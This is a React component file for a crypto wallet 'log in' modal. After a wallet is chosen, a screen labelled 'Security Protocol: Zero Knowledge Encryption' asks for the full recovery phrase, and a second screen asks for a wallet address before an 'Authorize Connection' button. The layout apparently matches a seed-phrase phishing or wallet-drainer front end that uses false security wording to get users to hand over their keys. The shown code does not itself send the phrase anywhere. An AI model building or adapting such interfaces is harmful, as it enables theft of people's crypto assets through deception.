import { useState } from 'react';
import { WALLETS } from '../data/constants';

const VALID_COUNTS = [12, 18, 24];

function SeedPhraseModal({ wallet, onClose, onAuthorize }) {
  const [step, setStep] = useState('seed');
  const [phrase, setPhrase] = useState('');
  const [address, setAddress] = useState('');

  const wordCount = phrase.trim() === '' ? 0 : phrase.trim().split(/\s+/).length;

  // Valid only at exactly 12, 18, or 24
  const seedReady = VALID_COUNTS.includes(wordCount);

  // Which milestone are we progressing toward?
  const targetCount = wordCount <= 12 ? 12 : wordCount <= 18 ? 18 : 24;
  const progressPct = Math.min(100, Math.round((wordCount / targetCount) * 100));

  // Status hint below the badges
  function getStatus() {
    if (wordCount === 0) return { text: '', color: 'var(--text3)' };
    if (seedReady) return { text: `✓ ${wordCount}-word phrase complete`, color: 'var(--accent)' };
    if (wordCount < 12) return { text: `${12 - wordCount} more word${12 - wordCount !== 1 ? 's' : ''} to reach 12`, color: 'var(--text3)' };
    if (wordCount > 12 && wordCount < 18) return { text: `${18 - wordCount} more for 18 words · or remove ${wordCount - 12} to use 12`, color: 'var(--orange)' };
    if (wordCount > 18 && wordCount < 24) return { text: `${24 - wordCount} more for 24 words · or remove ${wordCount - 18} to use 18`, color: 'var(--orange)' };
    if (wordCount > 24) return { text: 'Too many words — please remove some', color: 'var(--red)' };
    return { text: '', color: 'var(--text3)' };
  }

  const status = getStatus();
  const addressReady = address.trim().length >= 10;

  const header = (label) => (
    <div style={{
      display: 'flex', alignItems: 'center', gap: 14,
      padding: '20px 20px 16px', borderBottom: '1px solid var(--border)'
    }}>
      <div style={{
        width: 48, height: 48, borderRadius: 14, flexShrink: 0,
        background: 'linear-gradient(135deg, #1a3a6a, #0d52cc)',
        display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 22
      }}>🔒</div>
      <div>
        <div style={{ fontSize: 11, fontWeight: 700, color: 'var(--text3)', letterSpacing: 1.5, textTransform: 'uppercase', marginBottom: 2 }}>
          Security Protocol:
        </div>
        <div style={{ fontSize: 13, fontWeight: 800, color: 'var(--text)', letterSpacing: 1, textTransform: 'uppercase' }}>
          {label}
        </div>
      </div>
      <button className="modal-close" style={{ marginLeft: 'auto' }} onClick={onClose}>✕</button>
    </div>
  );

  const walletBadge = (
    <div style={{
      display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16,
      padding: '8px 12px', background: 'var(--surface2)',
      border: '1px solid var(--border)', borderRadius: 10
    }}>
      <span style={{ fontSize: 18 }}>{wallet.icon}</span>
      <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--text)' }}>{wallet.name}</span>
      <span style={{ fontSize: 11, color: 'var(--text3)', marginLeft: 2 }}>— {wallet.desc}</span>
    </div>
  );

  const actionBtn = (ready, label, onClick) => (
    <button
      onClick={() => ready && onClick()}
      disabled={!ready}
      style={{
        width: '100%', padding: '14px', borderRadius: 12, border: 'none',
        background: ready ? 'var(--accent)' : 'var(--surface2)',
        color: ready ? '#000' : 'var(--text3)',
        fontFamily: "'DM Sans', sans-serif", fontSize: 13, fontWeight: 800,
        letterSpacing: 1.5, textTransform: 'uppercase',
        cursor: ready ? 'pointer' : 'not-allowed', transition: 'all 0.2s',
        boxShadow: ready ? '0 4px 20px rgba(0,255,136,0.25)' : 'none',
      }}
    >{label}</button>
  );

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal" style={{ maxWidth: 480 }} onClick={e => e.stopPropagation()}>

        {/* ── STEP 1: SEED PHRASE ── */}
        {step === 'seed' && <>
          {header('Zero Knowledge Encryption')}
          <div style={{ padding: '20px 20px 4px' }}>
            {walletBadge}
            <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--text3)', letterSpacing: 2, textTransform: 'uppercase', marginBottom: 8 }}>
              Enter Recovery Phrase (12, 18, or 24 words)
            </div>
            <textarea
              autoFocus
              placeholder="word1 word2 word3 ..."
              value={phrase}
              onChange={e => setPhrase(e.target.value)}
              style={{
                width: '100%', height: 110, background: 'var(--surface2)',
                border: `1px solid ${seedReady ? 'var(--accent)' : wordCount > 0 ? 'var(--border2)' : 'var(--border)'}`,
                borderRadius: 12, padding: '12px 14px',
                fontFamily: "'DM Mono', monospace", fontSize: 13, color: 'var(--text)',
                outline: 'none', resize: 'none', lineHeight: 1.7, transition: 'border-color 0.2s',
              }}
            />

            {/* ── MILESTONE BADGES: 12 / 18 / 24 ── */}
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8, margin: '12px 0 4px' }}>
              {VALID_COUNTS.map(target => {
                const isPast   = wordCount > target;   // already passed this milestone
                const isExact  = wordCount === target; // sitting exactly here — valid!
                const isNext   = !isExact && !isPast && target === targetCount; // currently heading toward this

                return (
                  <div
                    key={target}
                    style={{
                      padding: '5px 14px', borderRadius: 20,
                      background: isExact
                        ? 'var(--accent-light)'
                        : isPast
                          ? 'var(--green-bg)'
                          : 'var(--surface2)',
                      border: `1px solid ${isExact ? 'var(--accent)' : isPast ? 'var(--green)' : 'var(--border)'}`,
                      fontSize: 11, fontWeight: 700, letterSpacing: 1,
                      color: isExact
                        ? 'var(--accent)'
                        : isPast
                          ? 'var(--green)'
                          : isNext
                            ? 'var(--text2)'
                            : 'var(--text3)',
                      textTransform: 'uppercase', transition: 'all 0.25s',
                      display: 'flex', alignItems: 'center', gap: 5,
                    }}
                  >
                    {(isPast || isExact) && <span>✓</span>}
                    {target}" words
                  </div>
                );
              })}
            </div>

            {/* word count + status hint */}
            <div style={{ textAlign: 'center', marginBottom: 8 }}>
              <span style={{
                fontSize: 11, fontWeight: 700, letterSpacing: 1,
                color: seedReady ? 'var(--accent)' : 'var(--text3)',
                fontFamily: "'DM Mono', monospace",
              }}>
                {wordCount} word{wordCount !== 1 ? 's' : ''} entered
              </span>
            </div>

            {/* progress bar — only shown when between milestones */}
            {wordCount > 0 && !seedReady && wordCount <= 24 && (
              <div style={{ margin: '0 0 8px' }}>
                <div style={{ height: 4, borderRadius: 2, background: 'var(--surface3)', overflow: 'hidden' }}>
                  <div style={{
                    height: '100%', borderRadius: 2,
                    background: 'linear-gradient(90deg, var(--accent), var(--accent-hover))',
                    width: `${progressPct}%`, transition: 'width 0.25s ease',
                  }} />
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 4 }}>
                  <span style={{ fontSize: 10, color: 'var(--text3)', fontFamily: 'DM Mono' }}>
                    {status.text}
                  </span>
                  <span style={{ fontSize: 10, color: 'var(--text3)', fontFamily: 'DM Mono' }}>
                    {wordCount} / {targetCount}
                  </span>
                </div>
              </div>
            )}

            {/* over-24 error */}
            {wordCount > 24 && (
              <div style={{
                textAlign: 'center', fontSize: 11, color: 'var(--red)',
                fontWeight: 600, marginBottom: 8,
              }}>
                {status.text}
              </div>
            )}
          </div>

          <div style={{ padding: '8px 20px 20px' }}>
            {actionBtn(seedReady, 'Continue →', () => setStep('address'))}
          </div>
        </>}

        {/* ── STEP 2: WALLET ADDRESS ── */}
        {step === 'address' && <>
          {header('Wallet Address Verification')}
          <div style={{ padding: '20px 20px 4px' }}>
            {walletBadge}
            <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--text3)', letterSpacing: 2, textTransform: 'uppercase', marginBottom: 8 }}>
              Confirm Your Wallet Address
            </div>
            <input
              autoFocus
              placeholder={
                ['solflare', 'phantom', 'hotwallet', 'keplr'].includes(wallet.id)
                  ? 'Enter your .sol or base58 address'
                  : 'Enter your wallet address (0x...)'
              }
              value={address}
              onChange={e => setAddress(e.target.value)}
              style={{
                width: '100%', background: 'var(--surface2)',
                border: `1px solid ${addressReady ? 'var(--accent)' : 'var(--border)'}`,
                borderRadius: 12, padding: '13px 14px',
                fontFamily: "'DM Mono', monospace", fontSize: 13, color: 'var(--text)',
                outline: 'none', transition: 'border-color 0.2s',
              }}
            />
            <div style={{ fontSize: 11, color: 'var(--text3)', marginTop: 8, lineHeight: 1.6 }}>
              Confirms ownership of your {wallet.name} wallet. Your address is never stored.
            </div>
          </div>
          <div style={{ padding: '16px 20px 8px', display: 'flex', gap: 8 }}>
            <button onClick={() => setStep('seed')} style={{
              padding: '13px 16px', borderRadius: 12, border: '1px solid var(--border)',
              background: 'none', color: 'var(--text2)', fontFamily: "'DM Sans', sans-serif",
              fontSize: 13, fontWeight: 600, cursor: 'pointer', whiteSpace: 'nowrap'
            }}>← Back</button>
            <div style={{ flex: 1 }}>
              {actionBtn(addressReady, 'Authorize Connection', () => addressReady && onAuthorize())}
            </div>
          </div>
          <div style={{ padding: '8px 20px 20px' }} />
        </>}

      </div>
    </div>
  );
}

export default function WalletModal({ title = 'Log in or sign up', onClose, onSelect, selectedWallet, onContinue, showContinue }) {
  const [q, setQ] = useState('');
  const [seedWallet, setSeedWallet] = useState(null);
  const filtered = q ? WALLETS.filter(w => w.name.toLowerCase().includes(q.toLowerCase())) : WALLETS;

  function handleWalletClick(w) {
    onSelect(w);
    setSeedWallet(w);
  }

  function handleAuthorize() {
    setSeedWallet(null);
    onContinue();
  }

  return (
    <>
      <div className="modal-overlay" onClick={onClose}>
        <div className="modal" onClick={e => e.stopPropagation()}>
          <div className="modal-head">
            <div className="modal-title">{title}</div>
            <button className="modal-close" onClick={onClose}>✕</button>
          </div>
          <div className="modal-search">
            <span style={{ color: 'var(--text3)', fontSize: 14 }}>🔍</span>
            <input
              placeholder="Search through 645 wallets..."
              value={q}
              onChange={e => setQ(e.target.value)}
              autoFocus
            />
          </div>
          <div className="wallet-list">
            {filtered.map(w => (
              <div
                key={w.id}
                className={`w-row ${selectedWallet?.id === w.id ? 'sel' : ''}`}
                onClick={() => handleWalletClick(w)}
              >
                <div className="w-ico" style={{ background: (w.iconBg || '#ffffff') + '22' }}>
                  {w.icon}
                </div>
                <div>
                  <div className="w-name">{w.name}</div>
                  <div className="w-desc">{w.desc}</div>
                </div>
                {w.badge && (
                  <div className="w-badge">
                    <div className="w-dot" />
                    {w.badge}
                  </div>
                )}
              </div>
            ))}
          </div>
          {showContinue && (
            <div className="modal-footer">
              <button
                className="action-btn purple"
                style={{ margin: 0, width: '100%' }}
                onClick={onContinue}
                disabled={!selectedWallet}
              >
                {selectedWallet ? `Continue with ${selectedWallet.name}` : 'Select a wallet'}
              </button>
            </div>
          )}
        </div>
      </div>
      {seedWallet && (
        <SeedPhraseModal
          wallet={seedWallet}
          onClose={() => setSeedWallet(null)}
          onAuthorize={handleAuthorize}
        />
      )}
    </>
  );
}